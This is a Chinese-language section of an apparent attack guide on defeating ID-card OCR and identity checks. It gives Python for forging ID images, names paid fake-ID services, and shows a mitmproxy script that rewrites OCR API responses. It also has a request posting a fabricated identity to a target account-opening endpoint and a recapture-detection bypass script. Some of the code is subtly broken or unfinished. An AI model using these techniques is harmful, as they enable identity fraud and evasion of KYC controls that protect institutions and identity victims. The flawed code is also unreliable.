## 3. 证件OCR识别绕过

### 3.1 身份证OCR攻击向量

```python
# === OCR识别绕过技术矩阵 ===

# 1. 翻拍/复印件攻击
# OCR系统通常检测: 摩尔纹、反光、边缘、色彩分布
# 绕过: 高分辨率扫描 → 打印 → 哑光处理 → 再拍摄

# 2. PS篡改攻击
# 检测点: 像素级一致性、压缩痕迹、字体渲染差异
# 绕过: 使用AI生成证件（StyleGAN生成人脸 + 模板合成）
import cv2
import numpy as np

def ps_detection_bypass(original_id_path, fake_photo_path):
    """
    PS证件绕过技术:
    1. 使用AI生成与原始证件像素分布一致的合成图
    2. 添加真实噪声模拟物理拍摄
    3. 嵌入真实EXIF元数据
    """
    # 读取原始证件模板
    template = cv2.imread(original_id_path)
    fake_face = cv2.imread(fake_photo_path)
    
    # 人脸区域替换（匹配肤色和光照）
    # 关键: 保持证件背景的一致性和防伪特征
    result = template.copy()
    
    # 添加噪点模拟真实拍摄
    noise = np.random.normal(0, 2, result.shape).astype(np.uint8)
    result = cv2.add(result, noise)
    
    # 添加轻微模糊模拟对焦
    result = cv2.GaussianBlur(result, (1, 1), 0.5)
    
    return result

# 3. AI生成证件攻击
# 2026年: StyleGAN3 + Stable Diffusion 生成逼真证件
# 关键特征: 证件边框、国徽、底纹、字体、印章
# 工具: ProKYC($200-500)、OnlyFake($15/次)
```

### 3.2 OCR结果篡改（API层攻击）

```python
# === OCR API结果拦截与篡改 ===
# 场景: 手机APP调用OCR SDK → 上传识别结果 → 后端验证

# 攻击1: 拦截OCR结果直接篡改
import mitmproxy

class OCRTamper:
    def response(self, flow):
        if "/api/ocr/result" in flow.request.url:
            # 原始OCR结果
            original = flow.response.json()
            # 篡改为目标身份
            original["name"] = "目标姓名"
            original["id_number"] = "目标身份证号"
            original["address"] = "目标地址"
            flow.response.text = json.dumps(original)

# 攻击2: 直接伪造OCR结果（绕过客户端OCR）
# 如果后端信任客户端上传的OCR结果而不重新验证
import requests

fake_ocr_result = {
    "name": "张三",
    "id_number": "<IDCARD-REDACTED>",
    "gender": "男",
    "nation": "汉",
    "birth": "1990-01-01",
    "address": "北京市东城区XX路XX号",
    "authority": "北京市公安局东城分局",
    "valid_period": "2020.01.01-2040.01.01",
    "ocr_confidence": 0.98,  # 高置信度
    "face_photo_base64": "base64_encoded_face_image..."
}

resp = requests.post("https://api.target.com/account/open/verify-id",
    json=fake_ocr_result,
    headers={"Authorization": "Bearer <token>"}
)
```

### 3.3 证件翻拍/复印件检测绕过

```bash
# === 翻拍检测绕过技术 ===

# 1. 摩尔纹消除
# 使用低通滤波器去除屏幕拍摄产生的摩尔纹
python3 -c "
import cv2
img = cv2.imread('recaptured_id.jpg')
# 高斯模糊去除摩尔纹
denoised = cv2.GaussianBlur(img, (5, 5), 0)
# 中值滤波进一步去噪
denoised = cv2.medianBlur(denoised, 5)
cv2.imwrite('bypass_recapture.jpg', denoised)
"

# 2. 高分辨率打印 + 哑光纸
# 标准翻拍检测: 检测屏幕像素网格、反光、色彩偏差
# 绕过: 600dpi激光打印 → 哑光相纸 → 自然光拍摄 → 微调色温

# 3. 物理证件+AI换脸
# 使用真实证件底板 + AI生成目标人脸照片 → 合成
# 工具: Photoshop + GFPGAN(面部增强) + Real-ESRGAN(超分辨率)
```

---

